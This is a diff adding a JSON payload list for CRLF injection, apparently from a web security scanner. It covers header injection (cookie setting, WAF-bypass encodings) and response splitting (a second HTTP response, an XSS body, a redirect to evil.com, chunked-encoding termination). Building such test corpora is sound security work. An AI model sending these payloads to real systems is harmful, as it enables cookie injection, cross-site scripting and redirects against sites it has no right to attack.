@@ -1,0 +1,33 @@
+{
+  "category": "crlf_injection",
+  "contexts": {
+    "header_injection": {
+      "description": "Inject arbitrary headers via CRLF sequences in user input reflected in response headers",
+      "payloads": [
+        {"payload": "%0d%0aX-Injected:true", "description": "URL-encoded CRLF header injection", "waf_bypass": false},
+        {"payload": "%0d%0aSet-Cookie:evil=1", "description": "Cookie injection via CRLF", "waf_bypass": false},
+        {"payload": "%0d%0aX-Injected:%20true", "description": "CRLF with space-prefixed value", "waf_bypass": false},
+        {"payload": "%0a%0dX-Injected:true", "description": "Reversed LF-CR order", "waf_bypass": false},
+        {"payload": "%0aX-Injected:true", "description": "LF-only header injection (some servers accept)", "waf_bypass": false},
+        {"payload": "%0dX-Injected:true", "description": "CR-only header injection", "waf_bypass": false},
+        {"payload": "%E5%98%8A%E5%98%8DX-Injected:true", "description": "Unicode CRLF (U+560A U+560D) for UTF-8 normalization bypass", "waf_bypass": true},
+        {"payload": "\\r\\nX-Injected:true", "description": "Literal backslash-escaped CRLF (server-side interpolation)", "waf_bypass": false},
+        {"payload": "%250d%250aX-Injected:true", "description": "Double URL-encoded CRLF", "waf_bypass": true},
+        {"payload": "%c0%8d%c0%8aX-Injected:true", "description": "Overlong UTF-8 encoding of CR LF", "waf_bypass": true}
+      ]
+    },
+    "response_splitting": {
+      "description": "Split the HTTP response to inject a full second response (body content injection)",
+      "payloads": [
+        {"payload": "%0d%0a%0d%0a<html>injected</html>", "description": "Response splitting with injected HTML body", "waf_bypass": false},
+        {"payload": "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>split</html>", "description": "Full response splitting with second HTTP response", "waf_bypass": false},
+        {"payload": "%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>", "description": "Response splitting with XSS payload in injected body", "waf_bypass": false},
+        {"payload": "%0d%0aLocation:https://evil.com%0d%0a%0d%0a", "description": "Header injection to redirect via Location header", "waf_bypass": false},
+        {"payload": "%0d%0aTransfer-Encoding:chunked%0d%0a%0d%0a0%0d%0a%0d%0a", "description": "Chunked TE injection to terminate response early", "waf_bypass": false},
+        {"payload": "\\n\\nHTTP/1.1 200 OK\\nContent-Type:text/html\\n\\n<html>split</html>", "description": "Backslash-n splitting for server-side interpolation", "waf_bypass": false},
+        {"payload": "%0d%0a%0d%0a{\"injected\":true}", "description": "Response splitting with JSON body injection", "waf_bypass": false},
+        {"payload": "%250d%250a%250d%250a<html>split</html>", "description": "Double-encoded response splitting", "waf_bypass": true}
+      ]
+    }
+  }
+}
